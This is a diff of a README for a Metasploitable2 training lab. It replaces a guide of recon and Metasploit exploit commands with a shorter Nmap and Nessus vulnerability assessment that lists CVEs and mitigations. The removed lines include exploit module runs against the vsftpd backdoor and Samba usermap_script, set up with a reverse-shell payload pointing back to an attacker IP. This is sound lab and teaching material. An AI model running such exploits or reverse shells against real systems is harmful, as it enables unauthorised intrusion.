@@ -1,163 +1,97 @@
-# Metasploitable2
+# 🔍 Vulnerability Assessment on Metasploitable2 using Nmap and Nessus
+
+## 📌 Overview
+
+This project demonstrates a vulnerability assessment on **Metasploitable2**, a deliberately vulnerable Linux machine, using a combination of **Nmap**, **Nessus Essentials**, and manual CVE research. The goal was to identify open ports, detect service versions, and uncover known security vulnerabilities that could potentially be exploited by attackers. The assessment includes both manual enumeration techniques and automated vulnerability scanning for comprehensive coverage.
 
 
-# Metasploitable2 Vulnerability Assessment: From Basic to Advanced
+## 🛠 Tools Used
 
-## Overview
+- **Nmap** – Port scanning, service/version detection, and NSE vulnerability scripts
+- **Nessus Essentials** – Vulnerability scanner used to detect critical and high-risk issues with CVE references and remediation guidance.
+- **Kali Linux** – Attacker machine
+- **Metasploitable2** – Vulnerable target machine (metaspolitable2 ip)
+- **Manual CVE Analysis** – Researched vulnerabilities based on Nmap findings
 
-Metasploitable2 is an intentionally vulnerable Linux virtual machine designed for security training and penetration testing practice. This comprehensive guide covers vulnerability assessment techniques from basic reconnaissance to advanced kernel exploitation, providing both manual and automated approaches for security professionals and ethical hackers.
 
-## Table of Contents
+## 📶 Lab Setup
 
-- [Part 1: Introduction & Setup](#part-1-introduction--setup)
-- [Part 2: Manual Recon & Automated Recon](#part-2-manual-recon--automated-recon)
-- [Part 3: Basic Exploits & Payload Usage](#part-3-basic-exploits--payload-usage)
-- [Part 4: Advanced Exploits & Custom Exploit Development](#part-4-advanced-exploits--custom-exploit-development)
-- [Part 5: Kernel Exploitation in Python & C++](#part-5-kernel-exploitation-in-python--c)
+| Component         | IP Address     |
+|------------------|----------------|
+| Attacker Machine | kali linux  |
+| Target Machine   | metasploitable2  |
 
----
+- Network: Host-Only Adapter (isolated environment)
 
-## Part 1: Introduction & Setup
 
-### What is Metasploitable2?
+## 🧪1: Nmap Scan - Steps Performed
 
-Metasploitable2 is a deliberately vulnerable Ubuntu Linux distribution containing numerous security flaws across multiple services and applications. Released by Rapid7, it serves as an ideal testing ground for penetration testers to practice their skills in a controlled environment without legal concerns.
+1. **Basic Port Scan**  
+   Identified open ports using `nmap <target-ip>`
 
-### Key Vulnerabilities Include:
-- Unpatched services (SSH, FTP, HTTP, SMB)
-- Weak authentication mechanisms
-- Misconfigured applications
-- Buffer overflow vulnerabilities
-- SQL injection flaws
-- Cross-site scripting (XSS) vulnerabilities
+2. **Service & Version Detection**  
+   Detected versions of running services:  
+   `nmap -sV <target-ip>`
 
-### Setup Requirements
+3. **Aggressive Scan with OS Detection**  
+   `nmap -A <target-ip>`
 
-\`\`\`bash
-# Download Metasploitable2 VM
-wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip
+4. **Vulnerability Script Scan**  
+   Used built-in Nmap NSE scripts:  
+   `nmap --script vuln <target-ip>`
 
-# Default credentials
-Username: msfadmin
-Password: msfadmin
+5. **Manual CVE Lookup**  
+   Based on Nmap output, identified known vulnerabilities with CVEs
 
-# Network configuration
-# Ensure VM is on isolated network for safety
-\`\`\`
 
----
+## 📝 Key Vulnerabilities Found
 
-## Part 2: Manual Recon & Automated Recon
-
-### Manual Reconnaissance
-
-Manual reconnaissance forms the foundation of any successful penetration test. It involves systematic information gathering using basic tools and techniques.
-
-#### Network Discovery
-\`\`\`bash
-# Ping sweep to identify live hosts
-nmap -sn 192.168.1.0/24
-
-# Basic port scan
-nmap -sS -O 192.168.1.100
-
-# Service version detection
-nmap -sV -p- 192.168.1.100
-\`\`\`
-
-#### Service Enumeration
-\`\`\`bash
-# SSH enumeration
-ssh -v 192.168.1.100
-
-# HTTP enumeration
-curl -I http://192.168.1.100
-dirb http://192.168.1.100
-
-# SMB enumeration
-enum4linux 192.168.1.100
-smbclient -L //192.168.1.100
-\`\`\`
-
-### Automated Reconnaissance
-
-Automated tools accelerate the reconnaissance phase and ensure comprehensive coverage.
-
-#### Comprehensive Scanning
-\`\`\`bash
-# Nmap comprehensive scan
-nmap -A -T4 -oA metasploitable_scan 192.168.1.100
-
-# Vulnerability scanning with Nessus
-# Configure Nessus policy for comprehensive scan
-
-# OpenVAS automated vulnerability assessment
-openvas-cli -T csv -o metasploitable_report.csv
-\`\`\`
-
-#### Automated Web Application Testing
-\`\`\`bash
-# Nikto web vulnerability scanner
-nikto -h http://192.168.1.100
-
-# OWASP ZAP automated scan
-zap-cli quick-scan http://192.168.1.100
-
-# SQLmap for SQL injection testing
-sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
-\`\`\`
+| Port | Service    | Version        | Vulnerability                        | CVE ID         | Risk  | Mitigation Suggestion                          |
+|------|------------|----------------|--------------------------------------|----------------|-------|------------------------------------------------|
+| 21   | vsftpd     | 2.3.4          | Backdoor command execution           | CVE-2011-2523  | High  | Disable vsftpd or upgrade to secure version   |
+| 443  | OpenSSL    | TLS/SSL        | Weak Diffie-Hellman key exchange     | CVE-2015-4000  | High  | Use strong ciphers, disable weak DH suites    |
+| 443  | SSL/TLS    | SSLv3 Enabled  | SSLv3 vulnerability (POODLE attack)  | CVE-2014-3566  | Medium| Disable SSLv3, enforce TLS 1.2 or higher       |
 
 ---
 
-## Part 3: Basic Exploits & Payload Usage
+## 📸 Screenshots
 
-### Understanding Metasploit Framework
+![p1](https://github.com/user-attachments/assets/28bd35d5-ef6b-4c16-b293-f62c0b37b163)
+![p2](https://github.com/user-attachments/assets/71f186d5-80ce-44c3-9e1e-723cf8f4fae9)
+![p3](https://github.com/user-attachments/assets/714d245a-fa23-48d4-a288-78978c24fa2d)
+![p4](https://github.com/user-attachments/assets/6710c0f6-c4ee-4133-8d15-8aff96ea65fd)
+![p5](https://github.com/user-attachments/assets/57be62f6-3ed4-4179-8eb0-97e847d87d82)
 
-The Metasploit Framework provides a comprehensive platform for exploit development and payload delivery.
 
-#### Basic Exploitation Workflow
-\`\`\`bash
-# Start Metasploit console
-msfconsole
 
-# Search for exploits
-search type:exploit platform:linux
 
-# Use specific exploit
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 192.168.1.100
-exploit
+## 🛡 Mitigation Summary
 
-# Payload selection
-set payload cmd/unix/reverse
-set LHOST 192.168.1.50
-set LPORT 4444
-\`\`\`
+- Disable insecure services like FTP and Telnet
+- Apply security patches to known vulnerable services
+- Upgrade legacy software to supported, secure versions
+- Enforce strong encryption and modern SSL/TLS protocols
 
-### Common Metasploitable2 Exploits
-
-#### FTP Backdoor Exploitation
-\`\`\`bash
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 192.168.1.100
-exploit
-\`\`\`
-
-#### SSH Weak Credentials
-\`\`\`bash
-use auxiliary/scanner/ssh/ssh_login
-set RHOSTS 192.168.1.100
-set USERNAME msfadmin
-set PASSWORD msfadmin
-run
-\`\`\`
-
-#### Samba Username Map Script
-\`\`\`bash
-use exploit/multi/samba/usermap_script
-set RHOSTS 192.168.1.100
-set payload cmd/unix/reverse
-exploit
-\`\`\`
 
 ---
+
+## 2. 🧪 Nessus Vulnerability Scan 
+
+To strengthen the assessment, a Nessus scan was also performed on the Metasploitable2 machine. This helped in identifying additional high-risk vulnerabilities with detailed CVE information and mitigation suggestions.
+
+### 🔍 Nessus Scan Summary
+
+- Scan Type: Advanced Network Scan
+- Target: metasplotable2 ip
+- Total Vulnerabilities Detected: 65
+  - Critical: 11
+  - High: 15
+  - Medium: 39
+  - 
+- Detected **65 vulnerabilities**
+- Identified multiple backdoors, outdated software, and misconfigurations
+- Target OS: **Linux Kernel*
+
+  
+### 📸 Nessus Screenshot
+![p6](https://github.com/user-attachments/assets/03a1819f-719e-49d9-be32-f4a872ac010e)
